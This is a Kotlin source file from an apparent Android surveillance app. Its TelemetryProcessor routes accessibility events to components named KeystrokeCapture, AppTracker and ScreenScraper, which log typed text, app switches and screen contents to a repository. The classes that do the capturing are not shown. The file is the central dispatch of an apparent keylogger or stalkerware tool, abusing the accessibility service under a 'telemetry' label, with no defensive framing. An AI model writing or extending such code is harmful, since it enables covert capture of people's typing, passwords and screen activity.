package com.zero.sentinel.telemetry

import android.view.accessibility.AccessibilityEvent
import android.util.Log

import com.zero.sentinel.data.repository.LogRepository

class TelemetryProcessor(private val repository: LogRepository) {

    private val keystrokeCapture = KeystrokeCapture(repository)
    private val appTracker = AppTracker(repository)
    private val screenScraper = ScreenScraper(repository)


    fun processEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                keystrokeCapture.handle(event)
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                appTracker.handle(event)
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                screenScraper.handle(event)
            }
            else -> {
                // Ignore other events
            }
        }
    }
}
